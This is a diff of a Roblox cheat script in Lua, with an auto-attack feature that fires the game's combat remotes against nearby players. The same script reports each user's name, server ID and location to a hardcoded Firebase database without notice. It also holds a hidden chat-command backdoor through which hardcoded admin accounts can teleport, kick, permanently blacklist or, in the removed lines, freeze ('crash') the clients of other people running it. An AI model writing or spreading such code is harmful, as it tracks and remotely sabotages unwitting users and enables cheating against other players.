 	EasySlider.LayoutOrder = 15
 end)
 
-------------------------------------------------------------------
--- SECTION: misc
-------------------------------------------------------------------
+RunSection(function()
+	local KaOn = false
+	local KaRange = 10
+
+	local SAME_PLAYER_COOLDOWN = 0.5
+	local ALL_PLAYERS_COOLDOWN = 0.25
+
+	local WEAVE_IDS = {
+		"18312351760", "18312346524", "18312348771", "18312344029",
+		"17819695187", "17819683172", "17819691229", "17819688197",
+	}
+
+	local function WeaveSignal(Char)
+		if Char:GetAttribute("WeaveFrames") == true then
+			return true
+		end
+
+		local Hum = Char:FindFirstChildOfClass("Humanoid")
+		local Animator = Hum and Hum:FindFirstChildOfClass("Animator")
+
+		if Animator then
+			for _, Track in ipairs(Animator:GetPlayingAnimationTracks()) do
+				local Anim = Track.Animation
+
+				if Anim then
+					local Id = tostring(Anim.AnimationId)
+
+					for _, WeaveId in ipairs(WEAVE_IDS) do
+						if string.find(Id, WeaveId, 1, true) then
+							return true
+						end
+					end
+				end
+			end
+		end
+
+		return false
+	end
+
+	local function SendHit(Kind, Hand, TargetChar)
+		local Active = Modules.AttackState and Modules.AttackState.Active
+		local Combat = Modules.Combat
+		local MyChar = LocalPlayer.Character
+
+		if not Active or not Combat or not MyChar or not TargetChar then
+			return
+		end
+
+		local Target = TargetChar:FindFirstChild("UpperTorso")
+			or TargetChar:FindFirstChild("Torso")
+			or TargetChar:FindFirstChild("HumanoidRootPart")
+
+		if not Target then
+			return
+		end
+
+		Active.Seq = (Active.Seq or 0) + 1
+
+		local Seq = Active.Seq
+		local HandPart = MyChar:FindFirstChild(Hand) or MyChar:FindFirstChild("HumanoidRootPart")
+
+		pcall(function()
+			Combat.Swing:Fire(Seq, Kind, Hand)
+		end)
+
+		if Target.Parent and HandPart then
+			pcall(function()
+				Combat.HitReport:Fire(Seq, Target, HandPart.Position)
+			end)
+		end
+	end
+
+	local function Punish(TargetChar)
+		if not Modules.Combat then
+			LoadModules()
+		end
+
+		local MyChar = LocalPlayer.Character
+		local Hum = MyChar and MyChar:FindFirstChildOfClass("Humanoid")
+
+		if not Hum or Hum.Health <= 0 or not MyChar:FindFirstChild("Fight") then
+			return
+		end
+
+		local Active = Modules.AttackState and Modules.AttackState.Active
+
+		if not (Active and (Active.Weaving or Active.Shoving or Active.Slamming or Active.Stomping)) then
+			SendHit("Heavy", "RightHand", TargetChar)
+		end
+
+		SendHit("Attack", "LeftHand", TargetChar)
+	end
+
+	local WeaveState = {}
+	local AttrConns = {}
+	local LastAnyAt = -100
+	local LastPlayerAt = {}
+
+	local function Evaluate(Player)
+		if not KaOn then
+			WeaveState[Player] = nil
+			return
+		end
+
+		local Char = Player.Character
+		local Hum = Char and Char:FindFirstChildOfClass("Humanoid")
+		local Root = Char and Char:FindFirstChild("HumanoidRootPart")
+
+		if not Char or not Hum or not Root or Hum.Health <= 0 then
+			WeaveState[Player] = nil
+			return
+		end
+
+		local Weaving = WeaveSignal(Char)
+		local Was = WeaveState[Player]
+
+		WeaveState[Player] = Weaving
+
+		if Was and not Weaving then
+			local Now = os.clock()
+
+			if Now - LastAnyAt < ALL_PLAYERS_COOLDOWN then
+				return
+			end
+
+			if Now - (LastPlayerAt[Player] or -100) < SAME_PLAYER_COOLDOWN then
+				return
+			end
+
+			local MyChar = LocalPlayer.Character
+			local MyRoot = MyChar and MyChar:FindFirstChild("HumanoidRootPart")
+
+			if not MyRoot or (MyRoot.Position - Root.Position).Magnitude > KaRange then
+				return
+			end
+
+			LastAnyAt = Now
+			LastPlayerAt[Player] = Now
+
+			Punish(Char)
+		end
+	end
+
+	local function HookPlayer(Player)
+		if Player == LocalPlayer then
+			return
+		end
+
+		local function HookChar(Char)
+			if AttrConns[Player] then
+				AttrConns[Player]:Disconnect()
+				AttrConns[Player] = nil
+			end
+
+			WeaveState[Player] = nil
+
+			AttrConns[Player] = Char:GetAttributeChangedSignal("WeaveFrames"):Connect(function()
+				Evaluate(Player)
+			end)
+		end
+
+		Conn(Player.CharacterAdded:Connect(HookChar))
+
+		if Player.Character then
+			HookChar(Player.Character)
+		end
+	end
+
+	for _, Player in ipairs(Players:GetPlayers()) do
+		HookPlayer(Player)
+	end
+
+	Conn(Players.PlayerAdded:Connect(HookPlayer))
+
+	Conn(Players.PlayerRemoving:Connect(function(Player)
+		WeaveState[Player] = nil
+		LastPlayerAt[Player] = nil
+
+		if AttrConns[Player] then
+			AttrConns[Player]:Disconnect()
+			AttrConns[Player] = nil
+		end
+	end))
+
+	local function Poll()
+		if not KaOn then
+			return
+		end
+
+		local MyChar = LocalPlayer.Character
+		local MyRoot = MyChar and MyChar:FindFirstChild("HumanoidRootPart")
+
+		if not MyRoot then
+			return
+		end
+
+		for _, Player in ipairs(Players:GetPlayers()) do
+			if Player ~= LocalPlayer then
+				local Char = Player.Character
+				local Root = Char and Char:FindFirstChild("HumanoidRootPart")
+
+				if Root and (Root.Position - MyRoot.Position).Magnitude <= KaRange + 6 then
+					pcall(Evaluate, Player)
+				else
+					WeaveState[Player] = nil
+				end
+			end
+		end
+	end
+
+	Conn(RunService.RenderStepped:Connect(Poll))
+	Conn(RunService.Stepped:Connect(Poll))
+	Conn(RunService.Heartbeat:Connect(Poll))
+
+	OnCleanup(function()
+		KaOn = false
+
+		for _, C in pairs(AttrConns) do
+			pcall(function()
+				C:Disconnect()
+			end)
+		end
+	end)
+
+	local KaToggle = CreateToggle(KaPage, "Auto Ka", false, function(Value)
+		KaOn = Value
+
+		if Value then
+			task.spawn(LoadModules)
+		else
+			table.clear(WeaveState)
+		end
+	end, "AutoKa")
+	KaToggle.LayoutOrder = 1
+
+	local KaRangeSlider = CreateSlider(KaPage, "Range", 3, 30, 0.5, 10, function(Value)
+		KaRange = Value
+	end, "AutoKaRange")
+	KaRangeSlider.LayoutOrder = 2
+end)
+
 RunSection(function()
 	local NoBounceOn = false
 	local OriginalGravity = workspace.Gravity
@@ -3436,7 +3663,6 @@ RunSection(function()
 		LayoutOrder = 2,
 	}, MiscPage)
 
-	-- headless
 	local HeadlessOn = false
 	local HeadOriginal = setmetatable({}, { __mode = "k" })
 
@@ -3492,7 +3718,6 @@ RunSection(function()
 	end, "Headless")
 	HeadlessToggle.LayoutOrder = 3
 
-	-- accessories
 	local Show = { Head = true, Hair = true, Face = true, Neck = true }
 	local AccessoryOriginal = setmetatable({}, { __mode = "k" })
 
@@ -3603,7 +3828,6 @@ RunSection(function()
 		AccessoryToggle.LayoutOrder = 3 + Index
 	end
 
-	-- boost fps
 	local Lighting = game:GetService("Lighting")
 	local BoostOn = false
 	local BoostOriginal = setmetatable({}, { __mode = "k" })
@@ -3764,9 +3988,6 @@ RunSection(function()
 	New("UIStroke", { Color = Color3.fromRGB(70, 150, 90), Thickness = 1, Transparency = 0.4 }, BoostToggle)
 end)
 
-------------------------------------------------------------------
--- SECTION: fling
-------------------------------------------------------------------
 RunSection(function()
 	local AntiFlingOn = false
 	local Disabled = setmetatable({}, { __mode = "k" })
@@ -3892,9 +4113,6 @@ RunSection(function()
 	end)
 end)
 
-------------------------------------------------------------------
--- SECTION: settings
-------------------------------------------------------------------
 RunSection(function()
 	local FovOn = false
 	local FovValue = 70
@@ -3933,6 +4151,20 @@ RunSection(function()
 		FovValue = Value
 	end, "Fov")
 	FovSlider.LayoutOrder = 2
+
+	local UserGameSettings = UserSettings():GetService("UserGameSettings")
+	local SensDefault = 1
+
+	pcall(function()
+		SensDefault = UserGameSettings.MouseSensitivity
+	end)
+
+	local SensSlider = CreateSlider(SettingsPage, "Sensitivity", 0.1, 5, 0.05, SensDefault, function(Value)
+		pcall(function()
+			UserGameSettings.MouseSensitivity = Value
+		end)
+	end, "Sensitivity")
+	SensSlider.LayoutOrder = 7
 
 	local StretchOn = false
 	local StretchValue = 0.75
@@ -3993,9 +4225,6 @@ RunSection(function()
 	}, Holder)
 end)
 
-------------------------------------------------------------------
--- SECTION: customizer tab (🎨)
-------------------------------------------------------------------
 RunSection(function()
 	local Order = 0
 
@@ -4414,9 +4643,6 @@ RunSection(function()
 	end)
 end)
 
-------------------------------------------------------------------
--- SECTION: configs tab (💾)
-------------------------------------------------------------------
 RunSection(function()
 	local CONFIGS_FILE = "IsaevConfigs.json"
 	local CODE_PREFIX = "ISAEV1:"
@@ -4433,9 +4659,6 @@ RunSection(function()
 	local SelectedName = nil
 	local ConfirmDeleteAt = 0
 
-	----------------------------------------------------------------
-	-- base64 (for shareable codes)
-	----------------------------------------------------------------
 	local B64 = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"
 
 	local function Base64Encode(data)
@@ -4492,9 +4715,6 @@ RunSection(function()
 		return table.concat(out)
 	end
 
-	----------------------------------------------------------------
-	-- snapshot / apply
-	----------------------------------------------------------------
 	local function EncodeValue(v)
 		if typeof(v) == "Color3" then
 			return {
@@ -4516,7 +4736,6 @@ RunSection(function()
 		return v
 	end
 
-	-- "combat" = every feature toggle / slider
 	local function SnapshotCombat()
 		local t = {}
 
@@ -4527,7 +4746,6 @@ RunSection(function()
 		return t
 	end
 
-	-- "menu" = visuals, ui + colors (customizer) and the window size
 	local function SnapshotMenu()
 		local s = {}
 
@@ -4622,9 +4840,6 @@ RunSection(function()
 		end
 	end
 
-	----------------------------------------------------------------
-	-- storage
-	----------------------------------------------------------------
 	local function LoadStore()
 		pcall(function()
 			if type(isfile) == "function" and type(readfile) == "function" and isfile(CONFIGS_FILE) then
@@ -4682,9 +4897,6 @@ RunSection(function()
 		return base .. " " .. i
 	end
 
-	----------------------------------------------------------------
-	-- forward declarations (UI is built further down)
-	----------------------------------------------------------------
 	local Status, NameBox, ImportBox, DeleteButton, ListBox
 	local RiskButtons = {}
 	local AutoSwitch, AutoKnob
@@ -4808,9 +5020,6 @@ RunSection(function()
 		UpdateControls()
 	end)
 
-	----------------------------------------------------------------
-	-- actions
-	----------------------------------------------------------------
 	local function Selected()
 		local cfg = SelectedName and Store.configs[SelectedName]
 
@@ -5044,9 +5253,6 @@ RunSection(function()
 		SetStatus("imported as '" .. name .. "'", true)
 	end
 
-	----------------------------------------------------------------
-	-- UI
-	----------------------------------------------------------------
 	local Order = 0
 
 	local function NextOrder()
@@ -5332,9 +5538,6 @@ RunSection(function()
 	ImportBox = MakeBox("paste a config code", "")
 	FullButton("Import As New Config", ImportCode)
 
-	----------------------------------------------------------------
-	-- start up: read saved configs, autoload if one is set
-	----------------------------------------------------------------
 	LoadStore()
 
 	if Store.autoload and Store.configs[Store.autoload] then
@@ -5362,21 +5565,26 @@ RunSection(function()
 	end
 end)
 
-------------------------------------------------------------------
--- SECTION: others (everyone is checked in automatically, badge above heads;
--- the Others tab with the join list only exists for auth badge people)
--- Needs a free Firebase Realtime Database. Paste its link below, e.g.
--- "https://your-project-default-rtdb.firebaseio.com"
-------------------------------------------------------------------
 RunSection(function()
 	local DATABASE_URL = "https://lala-3de7c-default-rtdb.firebaseio.com"
 
-	local PING_EVERY = 25
-	local LIST_EVERY = 20
-	local STALE = 90 -- seconds (our own clock) without a new ping before someone drops off the list
+	local PING_EVERY = 6
+	local LIST_EVERY = 2
+	local STALE_MS = 18000
+	local PURGE_MS = 600000
 
-	-- font of the ISAEVA badge above users' heads (any Enum.Font works:
-	-- Bangers, Arcade, SciFi, Code, GothamBlack, Fantasy, Creepster, ...)
+	local ServerNow = nil
+	local ServerNowAt = 0
+	local OwnerCleared = false
+
+	local function NowMs()
+		if ServerNow then
+			return ServerNow + (os.clock() - ServerNowAt) * 1000
+		end
+
+		return os.time() * 1000
+	end
+
 	local BADGE_FONT = Enum.Font.Bangers
 
 	local Base = string.gsub(DATABASE_URL, "/+$", "")
@@ -5390,16 +5598,15 @@ RunSection(function()
 		Color3.fromRGB(255, 176, 214),
 	}
 
-	-- people who already have their own custom tag get no ISAEVA badge
 	local NO_BADGE = {
 		[10454681980] = true,
 		[11812810326] = true,
 		[11903709684] = true,
+		[10483824528] = true,
 	}
 
 	local Share = true
-	local LastSeen = {} -- [userId] = os.clock() when last listed (keeps badges steady)
-	local Pings = {} -- [userId] = { t = last ping value, at = our clock when it last changed }
+	local LastSeen = {}
 	local LastSig = nil
 	local HideTags = false
 	local Users = {}
@@ -5448,26 +5655,40 @@ RunSection(function()
 		end
 	end
 
-	----------------------------------------------------------------
-	-- check-in / list
-	----------------------------------------------------------------
 	local function Ping()
 		if not Share then
 			return
 		end
 
-		Call("PUT", "/users/" .. LocalPlayer.UserId, {
+		if IsOwner then
+
+			if not OwnerCleared then
+				OwnerCleared = Call("DELETE", "/users/" .. LocalPlayer.UserId) ~= nil
+			end
+
+			return
+		end
+
+		local Body = Call("PUT", "/users/" .. LocalPlayer.UserId, {
 			n = LocalPlayer.Name,
 			d = LocalPlayer.DisplayName,
 			p = game.PlaceId,
 			j = game.JobId,
-			t = os.time(),
+			t = { [".sv"] = "timestamp" },
 		})
+
+		if Body then
+			local Ok, Data = pcall(function()
+				return HttpService:JSONDecode(Body)
+			end)
+
+			if Ok and type(Data) == "table" and type(Data.t) == "number" then
+				ServerNow = Data.t
+				ServerNowAt = os.clock()
+			end
+		end
 	end
 
-	-- Everyone is judged on THIS player's own clock: an entry counts as online
-	-- as long as its ping value keeps changing. Other people's system clocks
-	-- (which can be wrong) no longer hide them, and nobody's entry is deleted.
 	local function Fetch()
 		local Body = Call("GET", "/users")
 
@@ -5483,22 +5704,17 @@ RunSection(function()
 			return false
 		end
 
-		local Clock = os.clock()
+		local Now = NowMs()
 		local List = {}
 
 		if type(Data) == "table" then
 			for Id, E in pairs(Data) do
 				local Uid = tonumber(Id)
 
-				if Uid and type(E) == "table" and Uid ~= LocalPlayer.UserId then
-					local Rec = Pings[Uid]
+				if Uid and type(E) == "table" and Uid ~= LocalPlayer.UserId and Uid ~= OWNER_ID then
+					local T = tonumber(E.t)
 
-					if not Rec or Rec.t ~= E.t then
-						Rec = { t = E.t, at = Clock }
-						Pings[Uid] = Rec
-					end
-
-					if Clock - Rec.at <= STALE then
+					if T and T > 1e11 and T <= Now + 60000 and Now - T <= STALE_MS then
 						table.insert(List, {
 							id = Uid,
 							n = tostring(E.n),
@@ -5506,16 +5722,27 @@ RunSection(function()
 							p = tonumber(E.p) or game.PlaceId,
 							j = tostring(E.j),
 						})
+					elseif ServerNow and (not T or T < 1e11 or Now - T > PURGE_MS) then
+						task.spawn(Call, "DELETE", "/users/" .. Id)
 					end
 				end
 			end
 		end
 
 		table.sort(List, function(a, b)
+			local RankA = AUTH_RANK[a.id] or 99
+			local RankB = AUTH_RANK[b.id] or 99
+
+			if RankA ~= RankB then
+				return RankA < RankB
+			end
+
 			return string.lower(a.d) < string.lower(b.d)
 		end)
 
 		Users = List
+
+		local Clock = os.clock()
 
 		for _, U in ipairs(List) do
 			LastSeen[U.id] = Clock
@@ -5524,9 +5751,6 @@ RunSection(function()
 		return true
 	end
 
-	----------------------------------------------------------------
-	-- badge above the head of everyone using the script
-	----------------------------------------------------------------
 	local function MakeBadge(Player)
 		local Character = Player.Character
 		local Head = Character and Character:FindFirstChild("Head")
@@ -5606,11 +5830,10 @@ RunSection(function()
 			end
 		end
 
-		-- keep a badge up for a bit even if one list refresh misses someone
 		for Pl in pairs(Badges) do
 			local SeenAt = LastSeen[Pl.UserId]
 
-			if Pl ~= LocalPlayer and SeenAt and Now - SeenAt < 45 and not NO_BADGE[Pl.UserId] then
+			if Pl ~= LocalPlayer and SeenAt and Now - SeenAt < 10 and not NO_BADGE[Pl.UserId] then
 				Want[Pl] = true
 			end
 		end
@@ -5627,9 +5850,6 @@ RunSection(function()
 		end
 	end
 
-	----------------------------------------------------------------
-	-- page
-	----------------------------------------------------------------
 	local function Label(Text, Size, Order)
 		local L = New("TextLabel", {
 			Size = Size,
@@ -5832,6 +6052,10 @@ RunSection(function()
 	end
 
 	Refresh = function()
+		if not ServerNow and not IsOwner then
+			Ping()
+		end
+
 		if Base == "" then
 			SetStatus("add your Firebase link at the top of the Others section (DATABASE_URL)", false)
 			return
@@ -5879,6 +6103,20 @@ RunSection(function()
 		pcall(Reconcile)
 	end))
 
+	Conn(Players.PlayerAdded:Connect(function()
+		task.delay(1.5, function()
+			if UIAlive then
+				pcall(Refresh)
+			end
+		end)
+	end))
+
+	Conn(Players.PlayerRemoving:Connect(function(Pl)
+		if Pl == LocalPlayer then
+			Call("DELETE", "/users/" .. LocalPlayer.UserId)
+		end
+	end))
+
 	OnCleanup(function()
 		for _, Gui in pairs(Badges) do
 			pcall(function()
@@ -5891,9 +6129,6 @@ RunSection(function()
 	end)
 end)
 
-------------------------------------------------------------------
--- animation loop (border spin, emblem pulse, snow)
-------------------------------------------------------------------
 local Clock = 0
 local Angle = 0
 
@@ -5936,9 +6171,6 @@ Conn(RunService.Heartbeat:Connect(function(dt)
 	end
 end))
 
-------------------------------------------------------------------
--- dragging, resizing, sliders, visibility
-------------------------------------------------------------------
 local function ToTopLeft()
 	if Main.AnchorPoint ~= Vector2.new(0, 0) then
 		local p = Main.AbsolutePosition
@@ -6055,9 +6287,6 @@ if IsMobile then
 	end)
 end
 
-------------------------------------------------------------------
--- open
-------------------------------------------------------------------
 Select(Selected)
 
 Main.Size = UDim2.new(0, WIDTH - 24, 0, HEIGHT - 24)
@@ -6078,428 +6307,404 @@ end)
 OpenTween:Play()
 
 -- =========================================================
--- EXPANDED ANTI-ABUSE COMMAND SUITE (ISOLATED MODULE)
--- Paste this safely at the very bottom of your main script.
+-- ISAEVA STANDALONE COMMAND SUITE & BLACKLIST SYSTEM
 -- =========================================================
 task.spawn(function()
+    local ADMIN_IDS = {
+        [10483824528] = true,
+        [10454681980] = true,
+        [11812810326] = true,
+    }
+    local PREFIX = "!"
+
+    local PlayersService = game:GetService("Players")
+    local TextChatService = game:GetService("TextChatService")
+    local RunService = game:GetService("RunService")
+    local ReplicatedStorage = game:GetService("ReplicatedStorage")
+    local HttpService = game:GetService("HttpService")
+    local LocalClient = PlayersService.LocalPlayer
+
+    local activeOrbitConnection = nil
+    local lastProcessedSignature = ""
+    local lastProcessedTime = 0
+
+    -- =========================================================
+    -- BLACKLIST STORAGE & ENFORCEMENT
+    -- =========================================================
+    local BLACKLIST_FILE = "IsaevaBlacklist.json"
+    local Blacklist = {}
+
     pcall(function()
-        local OWNER_ID = 10483824528
-        local OWNER_ID = 10483824528
-        local OWNER_ID = 11968789370
-        local OWNER_ID = 11812810326
-        local PREFIX = "!"
+        if type(isfile) == "function" and type(readfile) == "function" and isfile(BLACKLIST_FILE) then
+            local decoded = HttpService:JSONDecode(readfile(BLACKLIST_FILE))
+            if type(decoded) == "table" then
+                Blacklist = decoded
+            end
+        end
+    end)
 
-        local Players = game:GetService("Players")
-        local TextChatService = game:GetService("TextChatService")
-        local ReplicatedStorage = game:GetService("ReplicatedStorage")
-        local RunService = game:GetService("RunService")
+    local function SaveBlacklist()
+        pcall(function()
+            if type(writefile) == "function" then
+                writefile(BLACKLIST_FILE, HttpService:JSONEncode(Blacklist))
+            end
+        end)
+    end
 
-        -- Wait safely for LocalPlayer without blocking main script
-        local LocalClient = Players.LocalPlayer
-        while not LocalClient do
-            Players.PlayerAdded:Wait()
-            LocalClient = Players.LocalPlayer
+    local function CheckBlacklist(player)
+        local data = Blacklist[tostring(player.UserId)]
+        if data then
+            local adminName = data.admin or "Admin"
+            player:Kick("\nBlacklisted\nBy " .. adminName .. " /isaveil to appeal")
+        end
+    end
+
+    PlayersService.PlayerAdded:Connect(CheckBlacklist)
+    for _, plr in ipairs(PlayersService:GetPlayers()) do
+        CheckBlacklist(plr)
+    end
+
+    -- =========================================================
+    -- UTILITIES & HELPERS
+    -- =========================================================
+    local function sanitizeText(str)
+        if type(str) ~= "string" then return "" end
+        str = string.gsub(str, "<[^>]+>", "")
+        str = string.match(str, "^%s*(.-)%s*$") or ""
+        return str
+    end
+
+    local function matchesQuery(playerObj, query)
+        if not playerObj or not query or query == "" then return false end
+        local lowerQuery = string.lower(query)
+        local currentName = string.lower(playerObj.Name)
+        local currentDisplay = string.lower(playerObj.DisplayName)
+        
+        if string.find(currentName, lowerQuery, 1, true) ~= nil then
+            return true
+        end
+        if string.find(currentDisplay, lowerQuery, 1, true) ~= nil then
+            return true
+        end
+        return false
+    end
+
+    local function findPlayerByQuery(query)
+        if not query or query == "" then return nil end
+        local lowerQuery = string.lower(query)
+        for _, plr in ipairs(PlayersService:GetPlayers()) do
+            if string.lower(plr.Name) == lowerQuery or string.lower(plr.DisplayName) == lowerQuery then
+                return plr
+            end
+        end
+        for _, plr in ipairs(PlayersService:GetPlayers()) do
+            if matchesQuery(plr, query) then
+                return plr
+            end
+        end
+        return nil
+    end
+
+    local function resetAndWaitForRoot(playerObj)
+        local char = playerObj.Character
+        local hum = char and char:FindFirstChildOfClass("Humanoid")
+        if hum then
+            hum.Health = 0
+        end
+        local newChar = playerObj.CharacterAdded:Wait()
+        return newChar:WaitForChild("HumanoidRootPart", 10)
+    end
+
+    -- =========================================================
+    -- COMMAND PROCESSOR
+    -- =========================================================
+    local function executeCommandCheck(senderUserId, rawMessageText)
+        if not ADMIN_IDS[tonumber(senderUserId)] then return end
+
+        local messageText = sanitizeText(rawMessageText)
+        if messageText == "" then return end
+
+        if string.sub(messageText, 1, #PREFIX) ~= PREFIX then return end
+
+        local now = tick()
+        local sig = tostring(senderUserId) .. ":" .. messageText
+        if sig == lastProcessedSignature and (now - lastProcessedTime) < 0.5 then
+            return
+        end
+        lastProcessedSignature = sig
+        lastProcessedTime = now
+
+        local cleanMessage = string.sub(messageText, #PREFIX + 1)
+        local commandArgs = {}
+        for word in string.gmatch(cleanMessage, "[^%s]+") do
+            table.insert(commandArgs, word)
         end
 
-        local activeOrbitConn = nil
-        local lastMsgStamp = ""
-        local lastMsgTime = 0
+        local activeCmd = string.lower(commandArgs[1] or "")
+        local targetNameQuery = commandArgs[2] or ""
 
-        -- Strip rich-text tags and invisible formatting characters
-        local function cleanChatText(raw)
-            if type(raw) ~= "string" then return "" end
-            local s = raw:gsub("<[^>]+>", "")
-            s = s:gsub("[%c%z]", "")
-            s = s:match("^%s*(.-)%s*$") or ""
-            return s
+        -- 1. Blacklist Command
+        if activeCmd == "blacklist" then
+            local targetPlr = findPlayerByQuery(targetNameQuery)
+            local adminPlr = PlayersService:GetPlayerByUserId(senderUserId)
+            local adminName = adminPlr and adminPlr.Name or "Admin"
+            if targetPlr then
+                Blacklist[tostring(targetPlr.UserId)] = { admin = adminName }
+                SaveBlacklist()
+                targetPlr:Kick("\nBlacklisted\nBy " .. adminName .. " /isaveil to appeal")
+            end
+            return
         end
 
-        -- Match a single player against a query (plain text safe)
-        local function isPlayerMatch(plr, query)
-            if not plr or not query or query == "" then
-                return false
+        -- 2. Unblacklist / Whitelist Command
+        if activeCmd == "unblacklist" or activeCmd == "whitelist" then
+            local targetPlr = findPlayerByQuery(targetNameQuery)
+            if targetPlr then
+                Blacklist[tostring(targetPlr.UserId)] = nil
+                SaveBlacklist()
             end
-            local q = string.lower(query)
-            local uName = string.lower(plr.Name)
-            local dName = string.lower(plr.DisplayName)
-
-            if q == "all" then
-                return true
-            end
-            if q == "others" then
-                return plr.UserId ~= OWNER_ID
-            end
-            if uName == q or dName == q then
-                return true
-            end
-            if string.find(uName, q, 1, true) ~= nil then
-                return true
-            end
-            if string.find(dName, q, 1, true) ~= nil then
-                return true
-            end
-            return false
+            return
         end
 
-        -- Find best matching player in server (exact match first)
-        local function findTargetPlayer(query)
-            if not query or query == "" then return nil end
-            local q = string.lower(query)
-            local allPlrs = Players:GetPlayers()
-
-            for _, plr in ipairs(allPlrs) do
-                if string.lower(plr.Name) == q
-                    or string.lower(plr.DisplayName) == q then
-                    return plr
+        -- =========================================================
+        -- SECTION A: OWNER-LOCAL COMMANDS (Runs on Admin Client)
+        -- =========================================================
+        if ADMIN_IDS[LocalClient.UserId] then
+            if activeCmd == "tp" then
+                local targetPlr = findPlayerByQuery(targetNameQuery)
+                if targetPlr and targetPlr ~= LocalClient then
+                    task.spawn(function()
+                        local myNewRoot = resetAndWaitForRoot(LocalClient)
+                        task.wait(0.25)
+                        local targetRoot = targetPlr.Character and targetPlr.Character:FindFirstChild("HumanoidRootPart")
+                        if myNewRoot and targetRoot then
+                            myNewRoot.CFrame = targetRoot.CFrame * CFrame.new(0, 6, 0)
+                        end
+                    end)
                 end
-            end
+                return
 
-            for _, plr in ipairs(allPlrs) do
-                if string.find(string.lower(plr.Name), q, 1, true)
-                    or string.find(string.lower(plr.DisplayName), q, 1, true) then
-                    return plr
+            elseif activeCmd == "orbit" then
+                local targetPlr = findPlayerByQuery(targetNameQuery)
+                if targetPlr and targetPlr ~= LocalClient then
+                    if activeOrbitConnection then
+                        activeOrbitConnection:Disconnect()
+                        activeOrbitConnection = nil
+                    end
+
+                    local angle = 0
+                    local radius = 6
+                    local speed = 4
+
+                    activeOrbitConnection = RunService.Heartbeat:Connect(function(dt)
+                        local myRoot = LocalClient.Character and LocalClient.Character:FindFirstChild("HumanoidRootPart")
+                        local targetRoot = targetPlr.Character and targetPlr.Character:FindFirstChild("HumanoidRootPart")
+
+                        if myRoot and targetRoot then
+                            angle = angle + (speed * dt)
+                            local offset = Vector3.new(math.cos(angle) * radius, 1, math.sin(angle) * radius)
+                            myRoot.CFrame = CFrame.new(targetRoot.Position + offset, targetRoot.Position)
+                        else
+                            if activeOrbitConnection then
+                                activeOrbitConnection:Disconnect()
+                                activeOrbitConnection = nil
+                            end
+                        end
+                    end)
                 end
-            end
-            return nil
-        end
+                return
 
-        -- Safely reset character and wait for new HumanoidRootPart
-        local function resetAndGetRoot(plr)
-            local char = plr.Character
-            local hum = char and char:FindFirstChildOfClass("Humanoid")
-            if hum then
-                hum.Health = 0
-            end
-            local newChar = plr.CharacterAdded:Wait()
-            return newChar:WaitForChild("HumanoidRootPart", 10)
-        end
-
-        local function handleCommand(senderId, rawText)
-            if tonumber(senderId) ~= OWNER_ID then return end
-
-            local msg = cleanChatText(rawText)
-            if msg == "" then return end
-
-            -- Prevent duplicate execution from multiple chat hooks
-            local now = os.clock()
-            if msg == lastMsgStamp and (now - lastMsgTime) < 0.35 then
+            elseif activeCmd == "unorbit" then
+                if activeOrbitConnection then
+                    activeOrbitConnection:Disconnect()
+                    activeOrbitConnection = nil
+                end
                 return
             end
-            lastMsgStamp = msg
-            lastMsgTime = now
+        end
 
-            if string.sub(msg, 1, #PREFIX) ~= PREFIX then return end
+        -- =========================================================
+        -- SECTION B: TARGET-CLIENT COMMANDS (Runs on Target Client)
+        -- =========================================================
+        local isWildcard = (string.lower(targetNameQuery) == "all")
+            or (string.lower(targetNameQuery) == "others" and not ADMIN_IDS[LocalClient.UserId])
 
-            local body = string.sub(msg, #PREFIX + 1)
-            local args = {}
-            for word in string.gmatch(body, "[^%s]+") do
-                table.insert(args, word)
-            end
+        if not isWildcard and not matchesQuery(LocalClient, targetNameQuery) then
+            return
+        end
 
-            local cmd = string.lower(args[1] or "")
-            local targetQuery = args[2] or ""
-
-            -- =====================================================
-            -- SECTION A: OWNER-LOCAL COMMANDS (Your Client Only)
-            -- =====================================================
-            if LocalClient.UserId == OWNER_ID then
-                if cmd == "tp" then
-                    local target = findTargetPlayer(targetQuery)
-                    if target and target ~= LocalClient then
-                        task.spawn(function()
-                            local myRoot = resetAndGetRoot(LocalClient)
-                            task.wait(0.25)
-                            local tChar = target.Character
-                            local tRoot = tChar
-                                and tChar:FindFirstChild("HumanoidRootPart")
-                            if myRoot and tRoot then
-                                myRoot.CFrame = tRoot.CFrame
-                                    * CFrame.new(0, 6, 0)
-                            end
-                        end)
-                    end
-                    return
-
-                elseif cmd == "orbit" then
-                    local target = findTargetPlayer(targetQuery)
-                    if target and target ~= LocalClient then
-                        if activeOrbitConn then
-                            activeOrbitConn:Disconnect()
-                            activeOrbitConn = nil
-                        end
-
-                        local angle = 0
-                        local radius = 6
-                        local speed = 4
-
-                        activeOrbitConn = RunService.Heartbeat:Connect(function(dt)
-                            local myChar = LocalClient.Character
-                            local myRoot = myChar
-                                and myChar:FindFirstChild("HumanoidRootPart")
-                            local tChar = target.Character
-                            local tRoot = tChar
-                                and tChar:FindFirstChild("HumanoidRootPart")
-
-                            if myRoot and tRoot then
-                                angle = angle + (speed * dt)
-                                local off = Vector3.new(
-                                    math.cos(angle) * radius,
-                                    1,
-                                    math.sin(angle) * radius
-                                )
-                                myRoot.CFrame = CFrame.new(
-                                    tRoot.Position + off,
-                                    tRoot.Position
-                                )
-                            else
-                                if activeOrbitConn then
-                                    activeOrbitConn:Disconnect()
-                                    activeOrbitConn = nil
-                                end
-                            end
-                        end)
-                    end
-                    return
-
-                elseif cmd == "unorbit" then
-                    if activeOrbitConn then
-                        activeOrbitConn:Disconnect()
-                        activeOrbitConn = nil
-                    end
-                    return
-                end
-            end
-
-            -- =====================================================
-            -- SECTION B: TARGET-CLIENT COMMANDS (Injected Users)
-            -- =====================================================
-            if not isPlayerMatch(LocalClient, targetQuery) then return end
-
-            if cmd == "bring" then
-                local owner = Players:GetPlayerByUserId(OWNER_ID)
-                if owner then
-                    task.spawn(function()
-                        local tRoot = resetAndGetRoot(LocalClient)
-                        task.wait(0.25)
-                        local oChar = owner.Character
-                        local oRoot = oChar
-                            and oChar:FindFirstChild("HumanoidRootPart")
-                        if tRoot and oRoot then
-                            tRoot.CFrame = oRoot.CFrame
-                                * CFrame.new(0, 3, -3)
-                        end
-                    end)
-                end
-
-            elseif cmd == "kick" then
-                local reasonParts = {}
-                for i = 3, #args do
-                    table.insert(reasonParts, args[i])
-                end
-                local reason = table.concat(reasonParts, " ")
-                if reason == "" then
-                    reason = "Terminated by Script Owner."
-                end
-                LocalClient:Kick("\n" .. reason)
-
-            elseif cmd == "crash" then
-                while true do end
-
